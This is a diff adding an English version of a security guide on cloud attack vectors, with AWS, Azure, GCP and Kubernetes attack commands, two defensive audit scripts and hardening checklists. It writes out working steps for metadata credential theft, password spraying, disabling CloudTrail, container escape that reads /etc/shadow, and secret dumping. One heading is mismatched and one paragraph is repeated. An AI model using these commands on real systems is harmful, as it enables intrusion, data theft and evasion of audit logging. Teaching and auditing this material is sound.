@@ -1,3 +1,9 @@
+> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)
+
+---
+
+<a name="한국어"></a>
+
 # 클라우드 공격 벡터 완전 분석
 
 ## 클라우드 위협 모델
@@ -904,4 +910,911 @@ python3 pacu.py
   - SIEM/SOAR 통합
   - UEBA (사용자/엔티티 행동 분석)
   - 자동 대응
+```
+
+---
+
+<a name="english"></a>
+
+# Complete Analysis of Cloud Attack Vectors
+
+## Cloud Threat Model
+
+```
+Cloud Attack Surface
+───────────────────────────────────────────
+  External Attacker     Insider        Supply Chain
+      │                  │               │
+  Misconfiguration   Excessive Privs  Vulnerable Deps
+  Exposed APIs       Credential Theft Malicious Images
+  Vulnerable Apps    Unauthorized Access CI/CD Attacks
+      └──────────────────┴───────────────┘
+                         │
+                   Cloud Assets
+              (S3/Storage/Instances/DB)
+───────────────────────────────────────────
+```
+
+---
+
+## 1. AWS Major Attack Vectors
+
+### IAM Privilege Abuse
+
+AWS IAM (Identity and Access Management) misconfigurations are the primary path for privilege escalation. When roles with excessive permissions or access keys are exposed, attackers can take control of the entire AWS environment.
+
+```
+IAM Attack Chain:
+  Access Public EC2
+      │
+  Obtain Temporary Credentials (Metadata Service)
+  http://169.254.169.254/latest/meta-data/iam/security-credentials/
+      │
+  Enumerate IAM Role Permissions
+  aws iam list-attached-role-policies --role-name ROLE_NAME
+      │
+  Discover Privilege Escalation Opportunities
+  aws iam simulate-principal-policy
+      │
+  Obtain Administrator Privileges
+  → Full AWS Account Takeover
+```
+
+```bash
+# Abusing IMDS (Instance Metadata Service)
+# Obtain temporary credentials from inside EC2
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+# → Returns role name
+
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/MyEC2Role
+# → Returns AccessKeyId, SecretAccessKey, Token
+
+# Use stolen credentials with AWS CLI
+export AWS_ACCESS_KEY_ID="ASIA..."
+export AWS_SECRET_ACCESS_KEY="..."
+export AWS_SESSION_TOKEN="..."
+
+aws sts get-caller-identity  # Check current permissions
+aws iam list-users           # List users
+aws s3 ls                    # List S3 buckets
+```
+
+### S3 Bucket Misconfiguration
+
+S3 bucket misconfigurations are the most common cause of cloud security incidents. Buckets with public access enabled can be viewed or written to without authentication. Use `aws s3 ls` to verify accessibility.
+
+```bash
+# Detect public buckets
+aws s3api list-buckets --query 'Buckets[].Name'
+
+# Check bucket public access
+aws s3api get-bucket-acl --bucket TARGET_BUCKET
+aws s3api get-bucket-policy --bucket TARGET_BUCKET
+
+# List public bucket contents (without authentication)
+aws s3 ls s3://TARGET_BUCKET --no-sign-request
+
+# Download files
+aws s3 cp s3://TARGET_BUCKET/sensitive.txt . --no-sign-request
+
+# S3 bucket brute force
+# Bucket names: company-name, company-backup, company-dev, company-staging...
+for suffix in "" "-backup" "-dev" "-staging" "-prod" "-data" "-logs"; do
+    aws s3 ls "s3://target-company${suffix}" --no-sign-request 2>/dev/null && \
+    echo "[+] Public bucket found: target-company${suffix}"
+done
+```
+
+### CloudTrail Log Disabling (Covering Tracks)
+
+```bash
+# Check CloudTrail status
+aws cloudtrail describe-trails
+aws cloudtrail get-trail-status --name mytrail
+
+# Stop logging (attacker action)
+aws cloudtrail stop-logging --name mytrail
+
+# Modify event selectors to exclude specific APIs
+aws cloudtrail put-event-selectors --trail-name mytrail \
+    --event-selectors '[{"ReadWriteType":"None"}]'
+```
+
+### Lambda Function Attacks
+
+```python
+#!/usr/bin/env python3
+"""
+AWS IAM Privilege Escalation Path Analysis Tool (Defensive — Red Team/Audit Only)
+Usage: python3 iam_privesc_check.py --profile default --region ap-northeast-2
+"""
+
+from __future__ import annotations
+
+import argparse
+import json
+import sys
+from dataclasses import dataclass, field
+from typing import Optional
+
+import boto3
+from botocore.exceptions import ClientError, NoCredentialsError
+
+
+@dataclass
+class PrivEscPath:
+    permission: str
+    description: str
+    risk: str  # CRITICAL | HIGH | MEDIUM
+    remediation: str
+
+
+# Known privilege escalation paths (based on Rhino Security Labs research)
+KNOWN_PRIVESC: list[PrivEscPath] = [
+    PrivEscPath("iam:CreatePolicyVersion",      "Add new version (Administrator) to existing policy",      "CRITICAL", "Remove iam:CreatePolicyVersion permission"),
+    PrivEscPath("iam:SetDefaultPolicyVersion",  "Activate previously stored high-privilege policy version", "CRITICAL", "Remove iam:SetDefaultPolicyVersion permission"),
+    PrivEscPath("iam:AttachUserPolicy",          "Attach AdministratorAccess policy to self",              "CRITICAL", "Restrict permission scope to specific ARN"),
+    PrivEscPath("iam:AttachGroupPolicy",         "Attach high-privilege policy to own group",              "CRITICAL", "Restrict permission scope to specific ARN"),
+    PrivEscPath("iam:PutUserPolicy",             "Grant self permissions via inline policy",               "CRITICAL", "Remove iam:PutUserPolicy permission"),
+    PrivEscPath("iam:AddUserToGroup",            "Add self to high-privilege group",                       "HIGH",     "Restrict permission scope to specific group ARN"),
+    PrivEscPath("iam:UpdateAssumeRolePolicy",    "Modify trust policy to assume high-privilege role",      "HIGH",     "Remove iam:UpdateAssumeRolePolicy permission"),
+    PrivEscPath("iam:CreateAccessKey",           "Create access keys for another IAM user",                "HIGH",     "Restrict permission scope to own ARN"),
+    PrivEscPath("iam:CreateLoginProfile",        "Set console password for another user",                  "HIGH",     "Restrict permission scope to own ARN"),
+    PrivEscPath("lambda:UpdateFunctionCode",     "Replace high-privilege Lambda code and execute",         "HIGH",     "Restrict scope to specific function ARN"),
+    PrivEscPath("ec2:AssociateIamInstanceProfile", "Attach high-privilege role profile to EC2",           "HIGH",     "Restrict to specific instance ARN"),
+    PrivEscPath("cloudformation:CreateStack",   "Create/use high-privilege role via CloudFormation",       "MEDIUM",   "Restrict cloudformation:CreateStack role ARN"),
+    PrivEscPath("glue:CreateDevEndpoint",        "Use high-privilege role in Glue development endpoint",   "MEDIUM",   "Restrict Glue role ARN"),
+    PrivEscPath("datapipeline:CreatePipeline",  "Execute high-privilege role via data pipeline",           "MEDIUM",   "Restrict datapipeline role ARN"),
+    PrivEscPath("iam:PassRole",                  "Pass high-privilege role to another service",             "MEDIUM",   "Strictly restrict iam:PassRole target role ARN"),
+]
+
+
+@dataclass
+class CheckResult:
+    principal_arn: str
+    allowed_permissions: list[str] = field(default_factory=list)
+    privesc_paths: list[PrivEscPath] = field(default_factory=list)
+
+    def to_dict(self) -> dict:
+        return {
+            "principal_arn": self.principal_arn,
+            "allowed_permissions": self.allowed_permissions,
+            "privesc_paths": [
+                {
+                    "permission": p.permission,
+                    "description": p.description,
+                    "risk": p.risk,
+                    "remediation": p.remediation,
+                }
+                for p in self.privesc_paths
+            ],
+        }
+
+
+# ------------------------------------------------------------------ #
+#  Permission Simulation
+# ------------------------------------------------------------------ #
+class IAMPrivEscChecker:
+    def __init__(self, session: boto3.Session) -> None:
+        self.iam = session.client("iam")
+        self.sts = session.client("sts")
+
+    def get_caller_arn(self) -> str:
+        return self.sts.get_caller_identity()["Arn"]
+
+    def simulate_permissions(
+        self,
+        principal_arn: str,
+        actions: list[str],
+        resource: str = "*",
+    ) -> list[str]:
+        """Return list of allowed permissions via simulation"""
+        allowed: list[str] = []
+        # API limit: maximum 100 actions per call
+        chunk_size = 100
+        for i in range(0, len(actions), chunk_size):
+            chunk = actions[i : i + chunk_size]
+            try:
+                resp = self.iam.simulate_principal_policy(
+                    PolicySourceArn=principal_arn,
+                    ActionNames=chunk,
+                    ResourceArns=[resource],
+                )
+                for ev in resp.get("EvaluationResults", []):
+                    if ev.get("EvalDecision") == "allowed":
+                        allowed.append(ev["EvalActionName"])
+            except ClientError as exc:
+                if exc.response["Error"]["Code"] != "NoSuchEntity":
+                    raise
+        return allowed
+
+    def check(self, principal_arn: Optional[str] = None) -> CheckResult:
+        if principal_arn is None:
+            principal_arn = self.get_caller_arn()
+
+        actions = [p.permission for p in KNOWN_PRIVESC]
+        print(f"[*] Simulating permissions: {principal_arn}", file=sys.stderr)
+        allowed = self.simulate_permissions(principal_arn, actions)
+
+        allowed_set = set(allowed)
+        result = CheckResult(principal_arn=principal_arn, allowed_permissions=allowed)
+        result.privesc_paths = [p for p in KNOWN_PRIVESC if p.permission in allowed_set]
+        return result
+
+
+# ------------------------------------------------------------------ #
+#  Output
+# ------------------------------------------------------------------ #
+def print_report(result: CheckResult, as_json: bool = False) -> None:
+    if as_json:
+        print(json.dumps(result.to_dict(), ensure_ascii=False, indent=2))
+        return
+
+    print(f"\n{'='*65}")
+    print(f"Principal ARN : {result.principal_arn}")
+    print(f"Allowed Permissions: {len(result.allowed_permissions)}")
+    print(f"Privilege Escalation Paths: {len(result.privesc_paths)}")
+
+    if not result.privesc_paths:
+        print("\n[+] No privilege escalation paths found")
+        return
+
+    risk_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2}
+    for p in sorted(result.privesc_paths, key=lambda x: risk_order.get(x.risk, 9)):
+        color = {"CRITICAL": "\033[91m", "HIGH": "\033[93m", "MEDIUM": "\033[94m"}.get(p.risk, "")
+        reset = "\033[0m"
+        print(f"\n  [{color}{p.risk}{reset}] {p.permission}")
+        print(f"    Description: {p.description}")
+        print(f"    Remediation: {p.remediation}")
+
+
+# ------------------------------------------------------------------ #
+#  CLI
+# ------------------------------------------------------------------ #
+def build_parser() -> argparse.ArgumentParser:
+    parser = argparse.ArgumentParser(
+        description="AWS IAM Privilege Escalation Path Analysis Tool (Audit/Red Team Only)",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="Examples:\n"
+               "  python3 iam_privesc_check.py --profile default\n"
+               "  python3 iam_privesc_check.py --profile audit --arn arn:aws:iam::123:user/bob\n"
+               "  python3 iam_privesc_check.py --profile default --json",
+    )
+    parser.add_argument("--profile", default="default", help="AWS CLI profile (default: default)")
+    parser.add_argument("--region", default="ap-northeast-2", help="AWS region")
+    parser.add_argument("--arn", metavar="ARN", help="Principal ARN to analyze (uses current credentials if not specified)")
+    parser.add_argument("--json", action="store_true", help="Output in JSON format")
+    return parser
+
+
+def main() -> None:
+    parser = build_parser()
+    args = parser.parse_args()
+
+    try:
+        session = boto3.Session(profile_name=args.profile, region_name=args.region)
+        checker = IAMPrivEscChecker(session)
+        result = checker.check(principal_arn=args.arn)
+        print_report(result, as_json=args.json)
+    except NoCredentialsError:
+        print("[-] No AWS credentials — run aws configure and retry", file=sys.stderr)
+        sys.exit(1)
+    except ClientError as exc:
+        print(f"[-] AWS API error: {exc}", file=sys.stderr)
+        sys.exit(1)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 2. Azure Attack Vectors
+
+### Azure AD Attacks
+
+```bash
+# Azure AD reconnaissance (ROADtools)
+pip install roadrecon
+roadrecon gather -u user@company.com -p password
+roadrecon gui
+
+# Enumerate as guest account
+az login --tenant TENANT_ID
+az ad user list --query "[].{UPN:userPrincipalName,Id:id}"
+az ad group list --query "[].{Name:displayName}"
+az ad sp list --query "[].{Name:displayName,AppId:appId}"
+
+# Enumerate administrative units
+az rest --method GET \
+    --uri "https://graph.microsoft.com/v1.0/directory/administrativeUnits"
+
+# Bypass conditional access policies (legacy authentication)
+# When conditional access only blocks Modern Auth
+# Attempt authentication via IMAP/POP3/SMTP (legacy protocols)
+python3 o365spray.py --enum --userfile users.txt --domain company.com
+python3 o365spray.py --spray -p "Spring2024!" --userfile valid_users.txt
+```
+
+### Azure SSRF via IMDS
+
+```bash
+# Access metadata from Azure VM
+curl -H "Metadata: true" \
+    "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+
+# Obtain Managed Identity token
+curl -H "Metadata: true" \
+    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/"
+
+# Use Azure API with obtained token
+TOKEN=$(curl -H "Metadata: true" "http://169.254.169.254/..." | jq -r .access_token)
+curl -H "Authorization: Bearer $TOKEN" \
+    "https://management.azure.com/subscriptions?api-version=2020-01-01"
+```
+
+---
+
+## 3. GCP Attack Vectors
+
+```bash
+# GCP Metadata Service
+curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
+    -H "Metadata-Flavor: Google"
+
+# Enumerate service account keys
+gcloud iam service-accounts list
+gcloud iam service-accounts keys list --iam-account=SA_EMAIL
+
+# Public access to storage buckets
+gsutil ls gs://TARGET_BUCKET
+gsutil cat gs://TARGET_BUCKET/sensitive_file.txt
+
+# Enumerate GCP permissions
+gcloud projects get-iam-policy PROJECT_ID
+gcloud iam roles list
+gcloud iam service-accounts get-iam-policy SA_EMAIL
+```
+
+---
+
+## 4. Container/Kubernetes Attacks
+
+### Docker Vulnerabilities
+
+```bash
+# Detect and abuse exposed Docker socket
+# Vulnerable: when docker.sock is mounted in a container
+ls -la /var/run/docker.sock
+
+# Container escape (privileged container)
+# Mount host filesystem
+docker run --privileged -v /:/host alpine chroot /host /bin/bash
+
+# Access host network
+docker run --net=host alpine
+
+# Dangerous execution flags
+docker run --cap-add=SYS_ADMIN --security-opt seccomp=unconfined ...
+```
+
+### Kubernetes Attacks
+
+```bash
+# Detect publicly accessible API server
+kubectl --server=https://TARGET_K8S:6443 get pods --all-namespaces \
+    --insecure-skip-tls-verify
+
+# Check if anonymous access is possible
+curl -k https://TARGET_K8S:6443/api/v1/namespaces
+curl -k https://TARGET_K8S:6443/api/v1/secrets
+
+# Use ServiceAccount token
+# From inside a pod:
+TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
+curl -k https://kubernetes.default.svc/api/v1/namespaces \
+    -H "Authorization: Bearer $TOKEN"
+
+# Check RBAC permissions
+kubectl auth can-i --list
+kubectl auth can-i get secrets -n kube-system
+
+# Privilege escalation (when create pods permission is available)
+# Create privileged pod with host mount
+cat <<EOF | kubectl apply -f -
+apiVersion: v1
+kind: Pod
+metadata:
+  name: privesc-pod
+spec:
+  containers:
+  - name: privesc
+    image: alpine
+    command: ["/bin/sh", "-c", "chroot /host /bin/bash"]
+    securityContext:
+      privileged: true
+    volumeMounts:
+    - mountPath: /host
+      name: host-volume
+  volumes:
+  - name: host-volume
+    hostPath:
+      path: /
+  hostNetwork: true
+  hostPID: true
+EOF
+
+# Direct etcd access (bypassing API server)
+etcdctl --endpoints=https://ETCD_IP:2379 \
+    --cacert=/etc/kubernetes/pki/etcd/ca.crt \
+    get / --prefix --keys-only | grep secrets
+```
+
+### Container Escape Techniques
+
+```bash
+# Technique 1: /proc/sched_debug information leak
+cat /proc/sched_debug | grep -i "host"
+
+# Technique 2: cgroups notify_on_release
+mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp
+mkdir /tmp/cgrp/x
+echo 1 > /tmp/cgrp/x/notify_on_release
+host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
+echo "$host_path/cmd" > /tmp/cgrp/release_agent
+echo '#!/bin/sh' > /cmd
+echo "cat /etc/shadow > $host_path/output" >> /cmd
+chmod a+x /cmd
+sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+cat /output
+
+# Technique 3: CVE-2019-5736 (runc vulnerability)
+# On runc versions < 1.0-rc6, host runc binary can be overwritten
+```
+
+---
+
+## 5. Serverless Attacks
+
+```python
+#!/usr/bin/env python3
+"""
+AWS Lambda Environment Variable Secret Exposure Audit Tool (Defensive)
+Usage: python3 lambda_secret_audit.py --profile default --region ap-northeast-2
+"""
+
+from __future__ import annotations
+
+import argparse
+import json
+import re
+import sys
+from dataclasses import dataclass, field
+from typing import Optional
+
+import boto3
+from botocore.exceptions import ClientError, NoCredentialsError
+
+
+# Sensitive key patterns
+_SENSITIVE_KEY_RE = re.compile(
+    r"(?i)(secret|password|passwd|api[_-]?key|token|credential|db[_-]?pass|"
+    r"private[_-]?key|access[_-]?key|auth|jwt|bearer|certificate)"
+)
+
+# Known secret value patterns (detect hardcoded values)
+_SECRET_VALUE_RE = re.compile(
+    r"(?i)(AKIA[0-9A-Z]{16}|"                  # AWS Access Key ID
+    r"[0-9a-zA-Z/+]{40}|"                       # AWS Secret Key length
+    r"eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.|"    # JWT
+    r"ghp_[A-Za-z0-9]{36}|"                    # GitHub PAT
+    r"sk-[A-Za-z0-9]{32,})"                    # OpenAI, etc.
+)
+
+
+@dataclass
+class FunctionFinding:
+    function_name: str
+    function_arn: str
+    runtime: str
+    role: str
+    sensitive_env_vars: list[dict] = field(default_factory=list)
+    hardcoded_secrets: list[dict] = field(default_factory=list)
+
+    @property
+    def has_issues(self) -> bool:
+        return bool(self.sensitive_env_vars or self.hardcoded_secrets)
+
+    def to_dict(self) -> dict:
+        return {
+            "function_name": self.function_name,
+            "function_arn": self.function_arn,
+            "runtime": self.runtime,
+            "role": self.role,
+            "sensitive_env_vars": self.sensitive_env_vars,
+            "hardcoded_secrets": self.hardcoded_secrets,
+        }
+
+
+class LambdaSecretAuditor:
+    def __init__(self, session: boto3.Session) -> None:
+        self.lmb = session.client("lambda")
+        self.findings: list[FunctionFinding] = []
+
+    def _paginate_functions(self):
+        paginator = self.lmb.get_paginator("list_functions")
+        for page in paginator.paginate():
+            yield from page.get("Functions", [])
+
+    def _analyze_env_vars(
+        self, env_vars: dict[str, str], function_name: str
+    ) -> tuple[list[dict], list[dict]]:
+        sensitive: list[dict] = []
+        hardcoded: list[dict] = []
+
+        for key, value in env_vars.items():
+            if _SENSITIVE_KEY_RE.search(key):
+                entry = {"key": key, "value_preview": value[:8] + "..." if len(value) > 8 else value}
+                sensitive.append(entry)
+
+                # Detect actual hardcoded secret values
+                if _SECRET_VALUE_RE.search(value):
+                    hardcoded.append({
+                        "key": key,
+                        "pattern_matched": True,
+                        "recommendation": "Migrate to AWS Secrets Manager or SSM Parameter Store",
+                    })
+
+        return sensitive, hardcoded
+
+    def audit(self) -> list[FunctionFinding]:
+        print("[*] Retrieving Lambda function list...", file=sys.stderr)
+        count = 0
+        for fn in self._paginate_functions():
+            count += 1
+            name = fn["FunctionName"]
+            arn = fn["FunctionArn"]
+            runtime = fn.get("Runtime", "unknown")
+            role = fn.get("Role", "")
+
+            try:
+                cfg = self.lmb.get_function_configuration(FunctionName=arn)
+            except ClientError:
+                continue
+
+            env = cfg.get("Environment", {}).get("Variables", {})
+            if not env:
+                continue
+
+            sensitive, hardcoded = self._analyze_env_vars(env, name)
+
+            if sensitive:
+                finding = FunctionFinding(
+                    function_name=name,
+                    function_arn=arn,
+                    runtime=runtime,
+                    role=role,
+                    sensitive_env_vars=sensitive,
+                    hardcoded_secrets=hardcoded,
+                )
+                self.findings.append(finding)
+
+        print(f"[*] Analysis complete: {count} functions examined", file=sys.stderr)
+        return self.findings
+
+
+# ------------------------------------------------------------------ #
+#  Output
+# ------------------------------------------------------------------ #
+def print_report(findings: list[FunctionFinding], as_json: bool = False) -> None:
+    issues = [f for f in findings if f.has_issues]
+
+    if as_json:
+        print(json.dumps([f.to_dict() for f in issues], ensure_ascii=False, indent=2))
+        return
+
+    print(f"\n{'='*65}")
+    print(f"Functions with issues: {len(issues)}")
+
+    for finding in issues:
+        print(f"\n  Function: {finding.function_name}")
+        print(f"  ARN     : {finding.function_arn}")
+        print(f"  Runtime : {finding.runtime}")
+        if finding.sensitive_env_vars:
+            print(f"  Sensitive env vars ({len(finding.sensitive_env_vars)}):")
+            for ev in finding.sensitive_env_vars:
+                icon = "!!" if any(h["key"] == ev["key"] for h in finding.hardcoded_secrets) else " "
+                print(f"    [{icon}] {ev['key']} = {ev['value_preview']}")
+        if finding.hardcoded_secrets:
+            print(f"  Suspected hardcoded secrets:")
+            for hc in finding.hardcoded_secrets:
+                print(f"    - {hc['key']}: {hc['recommendation']}")
+
+    if not issues:
+        print("[+] No sensitive environment variable exposure found")
+
+
+# ------------------------------------------------------------------ #
+#  CLI
+# ------------------------------------------------------------------ #
+def build_parser() -> argparse.ArgumentParser:
+    parser = argparse.ArgumentParser(
+        description="Lambda Environment Variable Secret Exposure Audit Tool",
+        epilog="Examples:\n"
+               "  python3 lambda_secret_audit.py --profile default\n"
+               "  python3 lambda_secret_audit.py --profile prod --region us-east-1 --json",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+    )
+    parser.add_argument("--profile", default="default", help="AWS profile")
+    parser.add_argument("--region", default="ap-northeast-2", help="AWS region")
+    parser.add_argument("--json", action="store_true", help="JSON output")
+    return parser
+
+
+def main() -> None:
+    parser = build_parser()
+    args = parser.parse_args()
+
+    try:
+        session = boto3.Session(profile_name=args.profile, region_name=args.region)
+        auditor = LambdaSecretAuditor(session)
+        findings = auditor.audit()
+        print_report(findings, as_json=args.json)
+    except NoCredentialsError:
+        print("[-] No AWS credentials found", file=sys.stderr)
+        sys.exit(1)
+    except ClientError as exc:
+        print(f"[-] AWS error: {exc}", file=sys.stderr)
+        sys.exit(1)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+---
+
+## 6. Cloud Lateral Movement
+
+Cloud penetration testing commands using the AWS CLI. Misconfigured S3 buckets, excessive IAM permissions, and exposed metadata services (SSRF vulnerabilities) are the primary attack vectors.
+
+```bash
+# AWS: Role switching (AssumeRole)
+aws sts assume-role \
+    --role-arn "arn:aws:iam::TARGET_ACCOUNT:role/CrossAccountRole" \
+    --role-session-name "attacker"
+
+# Access another account with the assumed role
+export AWS_ACCESS_KEY_ID="..."
+export AWS_SECRET_ACCESS_KEY="..."
+export AWS_SESSION_TOKEN="..."
+aws s3 ls  # Execute in the other AWS account
+
+# Internal movement via VPC peering
+aws ec2 describe-vpc-peering-connections
+aws ec2 describe-route-tables
+
+# Movement via Transit Gateway
+aws ec2 describe-transit-gateways
+```
+
+---
+
+## 7. Cloud Data Exfiltration Techniques
+
+Cloud penetration testing commands using the AWS CLI. Misconfigured S3 buckets, excessive IAM permissions, and exposed metadata services (SSRF vulnerabilities) are the primary attack vectors.
+
+```bash
+# Download entire S3 bucket
+aws s3 sync s3://target-bucket . --no-sign-request
+
+# Share RDS snapshots
+aws rds describe-db-snapshots --owner-id ACCOUNT_ID
+aws rds modify-db-snapshot-attribute \
+    --db-snapshot-identifier snap-xxx \
+    --attribute-name restore \
+    --values-to-add "all"  # Change to public
+
+# CloudFormation template (may contain secrets)
+aws cloudformation get-template --stack-name STACK_NAME
+
+# Dump AWS Secrets Manager
+aws secretsmanager list-secrets
+aws secretsmanager get-secret-value --secret-id SECRET_NAME
+
+# Dump Parameter Store
+aws ssm get-parameters-by-path --path "/" --recursive \
+    --with-decryption
+```
+
+---
+
+## 8. Defense: Cloud Security Hardening
+
+Cloud penetration testing commands using the AWS CLI. Misconfigured S3 buckets, excessive IAM permissions, and exposed metadata services (SSRF vulnerabilities) are the primary attack vectors.
+
+```bash
+# Enable AWS Security Hub
+aws securityhub enable-security-hub
+aws securityhub enable-standards \
+    --standards-subscription-requests "StandardsArn=arn:aws:securityhub:::ruleset/cis-aws-foundations-benchmark/v/1.2.0"
+
+# Enable GuardDuty
+aws guardduty create-detector --enable
+
+# Block public S3 access
+aws s3api put-public-access-block \
+    --bucket TARGET_BUCKET \
+    --public-access-block-configuration \
+    "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"
+
+# Enforce IMDSv2 (SSRF defense)
+aws ec2 modify-instance-metadata-options \
+    --instance-id INSTANCE_ID \
+    --http-tokens required \
+    --http-endpoint enabled
+
+# Enable CloudTrail for all regions
+aws cloudtrail create-trail \
+    --name all-region-trail \
+    --s3-bucket-name my-cloudtrail-bucket \
+    --is-multi-region-trail
+
+# Enable IAM Access Analyzer
+aws accessanalyzer create-analyzer \
+    --analyzer-name MyAnalyzer \
+    --type ACCOUNT
+```
+
+### CIS AWS Foundations Key Checks
+
+```
+IAM:
+  □ Enable MFA on root account
+  □ Enforce strong IAM password policy
+  □ Disable access keys unused for 90+ days
+  □ Rotate access keys periodically (90 days)
+  □ Alert on IAM policy changes in CloudTrail
+
+Storage:
+  □ Block public S3 access
+  □ Enable S3 bucket logging
+  □ Enable S3 server-side encryption (SSE-S3 or SSE-KMS)
+  □ Enable MFA Delete on critical buckets
+
+Network:
+  □ Block all traffic in VPC default security group
+  □ Enable VPC flow logs
+  □ Do not allow SSH (22) open to 0.0.0.0/0
+  □ Do not allow RDP (3389) open to 0.0.0.0/0
+
+Monitoring:
+  □ Enable CloudTrail for all regions
+  □ Enable CloudTrail log file integrity validation
+  □ Enable GuardDuty
+  □ Enable Security Hub
+  □ Configure Config Rules
+```
+
+---
+
+## 9. Cloud Security Threat Landscape (2020s)
+
+### Major Cloud Security Threat Trends
+
+```
+Primary Causes of Cloud Security Incidents (by proportion):
+  1. Misconfiguration ─────────────────────── 68%
+     - Public S3 buckets
+     - Excessive IAM permissions
+     - Over-permissive security groups
+  
+  2. Weak Credential Management ──────────── 19%
+     - Hardcoded API keys
+     - Unused access keys not deleted
+     - MFA not enforced
+  
+  3. Insider Threats ─────────────────────── 8%
+     - Abuse of excessive privileges
+     - Unauthorized data exfiltration
+  
+  4. Vulnerable Interfaces/APIs ──────────── 5%
+     - Unauthenticated API endpoints
+     - Weak authentication mechanisms
+```
+
+### Cloud Shared Responsibility Model
+```
+             Customer Responsibility  │  Cloud Provider Responsibility
+─────────────────────────────────────────────────────────────────────
+IaaS:    Data, OS, Apps              │  Physical, Network, Hypervisor
+PaaS:    Data, Apps                  │  Physical through Runtime
+SaaS:    Data, Configuration         │  Physical through Application
+─────────────────────────────────────────────────────────────────────
+Shared:  Account management, MFA, Encryption key management, Data classification
+```
+
+### Cloud Security Tools and Frameworks
+```bash
+# ScoutSuite — Multi-cloud security audit
+pip install scoutsuite
+scout aws
+scout azure --tenant TENANT_ID
+scout gcp --project PROJECT_ID
+
+# Prowler — AWS security audit
+pip install prowler
+prowler aws                          # Full audit
+prowler aws --checks s3_bucket_public  # Specific check
+
+# Pacu — AWS red team framework
+git clone https://github.com/RhinoSecurityLabs/pacu
+python3 pacu.py
+# pacu> import_keys PROFILE_NAME
+# pacu> run iam__enum_users_roles_policies_groups
+```
+
+---
+
+## 10. Zero Trust Security Model
+
+### Zero Trust Core Principles
+
+```
+Traditional Perimeter Security:        Zero Trust:
+  External = Untrusted                   Everything = Untrusted
+  Internal = Trusted          →          Always Verify
+  Perimeter firewall-centric             Principle of Least Privilege
+                                         Continuous Monitoring
+```
+
+### Five Pillars of Zero Trust (Based on NIST SP 800-207)
+```
+1. Identity and Access Management (Identity)
+   - Enforce strong MFA
+   - Continuous user verification
+   - Conditional access policies
+
+2. Device Security (Device)
+   - Verify device health status
+   - Only authenticated devices allowed access
+   - MDM/EDR required
+
+3. Network (Network)
+   - Microsegmentation
+   - Encrypted communications (TLS 1.3)
+   - Network traffic inspection
+
+4. Application Workloads (Application)
+   - API security
+   - Per-application access control
+   - Runtime protection
+
+5. Data (Data)
+   - Data classification and labeling
+   - Data encryption (at rest and in transit)
+   - DLP (Data Loss Prevention)
+```
+
+### Zero Trust Implementation Phases
+```
+Phase 1: Gain Visibility
+  - Identify and inventory all assets
+  - Map traffic flows
+  - Classify data
+
+Phase 2: Microsegmentation
+  - Migrate from legacy VLANs to fine-grained policy-based isolation
+  - Control east-west traffic
+
+Phase 3: Apply Least Privilege
+  - Just-in-Time (JIT) access
+  - Just-Enough-Access (JEA)
+  - Privileged account isolation (PAM)
+
+Phase 4: Continuous Verification and Monitoring
+  - SIEM/SOAR integration
+  - UEBA (User and Entity Behavior Analytics)
+  - Automated response
 ```
